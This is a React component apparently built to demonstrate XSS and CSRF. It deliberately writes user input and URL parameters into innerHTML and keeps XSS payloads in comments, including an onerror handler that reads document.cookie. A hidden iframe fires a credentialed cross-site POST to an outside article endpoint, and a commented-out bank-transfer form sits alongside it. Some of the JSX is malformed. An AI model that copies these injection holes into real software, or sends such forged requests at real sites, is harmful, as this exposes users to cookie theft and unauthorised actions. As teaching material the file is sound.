import React, { Component } from 'react';
import { Input } from './component/input';

export default class SecurityDemo extends Component {
    constructor() {
        super();
        this.state = {
            // <script charset="utf-8">alert(123)</script>
            // xss: '<div class="btn-n" onclick="(function(){console.log(123)})()">asdf<img src=1 onerror=alert(document.cookie)></div>'
            xss: ''
        };
    }
    componentDidMount() {
        this.refs.xss.innerHTML = this.state.xss;
        // const myScript = document.createElement('script');
        // myScript.type = 'text/javascript';
        // myScript.innerHTML = 'alert(123)';
        // document.body.appendChild(myScript);
        this.refs.xss1.innerHTML = this.getParams('name');
        this.steal();
    }
    haneldChangeXSS(v) {
        this.setState({ xss: v });
        this.refs.xss.innerHTML = v;
    }
    getParams(key) {
        const reg = new RegExp(`(&|^)${key}=([^&]*)($|&)`);
        const res = window.location.search.substr(1).match(reg);
        if (res != null) {
            return unescape(res[2]);
        }
        return null;
    }
    steal() {
        // const iframe = document.frames['steal'];
        const iframe = this.refs.csrf;
        // iframe.document.Submit('transfer');
        console.dir(iframe);
    }
    requestPost() {
        const xhr = new XMLHttpRequest();
        const url = 'http://www.brandf.cn:8010/article';
        // let fd = new FormData();
        // fd.append('people', '123');
        // fd.append('ck', '123');
        const data = JSON.stringify({
            content: 'csrf23333',
            id: '',
            title: 'csrf23333'
        });
        xhr.open('POST', url);
        xhr.setRequestHeader('content-type', 'application/json');
        xhr.withCredentials = true;
        xhr.send(data);
        xhr.onreadystatechange = function () {
            if (xhr.readyState == 4 && xhr.status == 200) {
                console.log(xhr.response);
            }
        };
    }
    render() {
        return (
            <div>
                <Input maxLength={300} onChange={(v) => this.haneldChangeXSS(v)} />
                {document.innerHtml = this.state.xss}
                <div id="xss" ref="xss"></div>
                <div>
                    <div>getParams</div>
                    wellcome! <div ref="xss1"></div>
                </div>
                <iframe name="steal" className="d-n" ref="csrf">
                    <script>
                        {this.requestPost()}
                    </script>
                    {/* <form method="POST" name="transfer" action="http://www.brandf.cn:8010/article">
                        <input type="hidden" name="toBankId" value="11" />
                        <input type="hidden" name="money" value="1000" />
                    </form> */}
                </iframe>
            </div>
        );
    }
}
